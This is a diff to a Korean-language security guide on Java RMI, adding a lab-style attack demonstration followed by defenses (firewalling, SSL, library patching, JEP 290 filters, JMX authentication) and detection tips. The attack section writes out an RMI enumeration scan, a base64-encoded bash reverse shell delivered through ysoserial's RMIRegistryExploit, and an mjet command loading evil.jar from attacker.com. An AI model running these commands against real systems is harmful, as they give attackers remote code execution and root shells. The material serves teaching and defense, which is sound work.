@@ -55,17 +55,165 @@ java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit <target> 1099 Common
 
 ---
 
-## 4. 탐지 및 보안 대책
+## 4. 보안 고려사항
 
-### 탐지 방법
+Java RMI 취약점은 한 번 악용되면 **원격 코드 실행(RCE)**으로 이어지므로 치명적이다.
+
+### 4.1. 공격 시연 (Lab 환경)
+
+#### 공격 1: RMI Registry 열거 → 정보 수집
+
+**[취약한 환경]**
+*   RMI 포트(1099)가 외부에 노출
+*   방화벽 미설정
+
+**[공격 과정]**
+```bash
+# 1. RMI 서비스 탐지
+nmap -sV -p 1099 --script rmi-dumpregistry <target>
+
+# 출력 예시:
+# PORT     STATE SERVICE
+# 1099/tcp open  rmiregistry
+# | rmi-dumpregistry:
+# |   jmxrmi
+# |     javax.management.remote.rmi.RMIServerImpl_Stub
+# |     ...
+```
+
+**[공격 결과]**: 등록된 객체 정보 노출 → 공격 벡터 파악 🔓
+
+---
+
+#### 공격 2: ysoserial을 이용한 RCE
+
+**[취약한 환경]**
+*   서버에 취약한 라이브러리(Apache Commons Collections 등) 존재
+*   직렬화 필터(JEP 290) 미적용
+
+**[공격 과정]**
+```bash
+# 1. 공격자 PC에서 리스너 준비
+nc -lvnp 4444
+
+# 2. Reverse Shell 페이로드를 Base64로 인코딩
+echo 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1' | base64
+# 출력: YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzQ0NDQgMD4mMQ==
+
+# 3. ysoserial로 익스플로잇 전송
+java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit <target> 1099 CommonsCollections5 \
+  "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}"
+
+# 4. 리스너에서 쉘 획득
+# Connection from 10.0.0.50
+# root@victim:~$ whoami
+# root
+```
+
+**[공격 결과]**: 악성 직렬화 객체 → 원격 코드 실행 → 시스템 장악 🔓
+
+---
+
+#### 공격 3: JMX (Java Management Extensions) 악용
+
+**[취약한 환경]**
+*   JMX가 인증 없이 원격 접근 허용
+*   RMI를 통해 JMX 연결 가능
+
+**[공격 과정]**
+```bash
+# 1. JMX 콘솔 연결 (인증 없이)
+jconsole <target>:1099
+
+# 2. MBean을 통해 임의 명령 실행
+# javax.management → MLet MBean 로드 → 악성 코드 실행
+
+# 또는 mjet 도구 사용
+java -jar mjet.jar -m load -t <target> -p 1099 -u http://attacker.com/evil.jar -payload Exec 'id'
+```
+
+**[공격 결과]**: JMX MBean을 통한 원격 코드 실행 🔓
+
+---
+
+### 4.2. 방어 대책
+
+| 공격 | 방어 |
+|:---|:---|
+| RMI 열거 | 방어 1 |
+| ysoserial RCE | 방어 2, 3, 4 |
+| JMX 악용 | 방어 1, 5 |
+
+---
+
+#### 방어 1: 네트워크 격리
+
+RMI 포트(1099 및 동적 포트)에 대한 외부 접근을 방화벽으로 차단한다.
+
+```bash
+# iptables: 내부 네트워크에서만 RMI 허용
+iptables -A INPUT -p tcp --dport 1099 -s 10.0.0.0/24 -j ACCEPT
+iptables -A INPUT -p tcp --dport 1099 -j DROP
+
+# 또는 RMI 서버 설정에서 바인딩 주소 제한
+# -Djava.rmi.server.hostname=127.0.0.1
+```
+
+---
+
+#### 방어 2: SSL/TLS 및 클라이언트 인증
+
+RMI 통신에 암호화와 상호 인증을 적용한다.
+
+```java
+// RMI over SSL 설정
+RMIClientSocketFactory csf = new SslRMIClientSocketFactory();
+RMIServerSocketFactory ssf = new SslRMIServerSocketFactory();
+Registry registry = LocateRegistry.createRegistry(1099, csf, ssf);
+```
+
+---
+
+#### 방어 3: 취약 라이브러리 패치/제거
+
+알려진 역직렬화 취약점이 있는 라이브러리를 최신 버전으로 업데이트하거나 제거한다.
+
+**주요 취약 라이브러리:**
+*   Apache Commons Collections 3.x → 4.x 이상 또는 제거
+*   Spring Framework → 최신 보안 패치 적용
+*   Jackson, XStream → 다형성 타입 처리 비활성화
+
+---
+
+#### 방어 4: 직렬화 필터 (JEP 290)
+
+JDK 9+에서 제공하는 직렬화 필터로 화이트리스트에 없는 클래스의 역직렬화를 차단한다.
+
+```bash
+# JVM 옵션으로 필터 설정
+java -Djdk.serialFilter="!*" -jar app.jar  # 모든 역직렬화 차단
+
+# 또는 화이트리스트 방식
+java -Djdk.serialFilter="com.myapp.**;java.util.*;!*" -jar app.jar
+```
+
+---
+
+#### 방어 5: JMX 보안 강화
+
+JMX 원격 접근 시 인증과 SSL을 강제한다.
+
+```bash
+# JVM 옵션
+-Dcom.sun.management.jmxremote.authenticate=true
+-Dcom.sun.management.jmxremote.ssl=true
+-Dcom.sun.management.jmxremote.password.file=/path/to/jmxremote.password
+```
+
+### 4.3. 탐지 방법
+
 *   **포트 스캔**: 외부에서 접근 가능한 1099 포트 확인.
-*   **네트워크 로그**: RMI 프로토콜 특유의 직렬화 헤더(`AC ED 00 05`) 트래픽 모니터링.
-*   **로그 분석**: JVM 로그에서 `ClassNotFoundException` 등 역직렬화 관련 예외 발생 여부 확인.
-
-### 보안 대책
-1.  **네트워크 격리**: RMI 포트(1099 및 동적 포트)에 대한 방화벽 접근 통제 (외부 접근 차단).
-2.  **SSL/TLS 적용**: RMI 통신 시 SSL/TLS를 적용하고 클라이언트 인증(Mutual Auth)을 수행한다.
-3.  **라이브러리 패치**: `Apache Commons Collections` 등 알려진 취약점이 있는 라이브러리를 최신 버전으로 업데이트하거나 제거한다.
-4.  **직렬화 필터링**: JDK 9+부터 도입된 **JEP 290** 직렬화 필터를 적용하여 화이트리스트에 없는 클래스의 역직렬화를 차단한다.
+*   **네트워크 모니터링**: RMI 프로토콜의 직렬화 헤더(`AC ED 00 05`) 트래픽 탐지.
+*   **JVM 로그 분석**: `ClassNotFoundException`, `InvalidClassException` 등 역직렬화 관련 예외 모니터링.
 
 <hr class="short-rule">
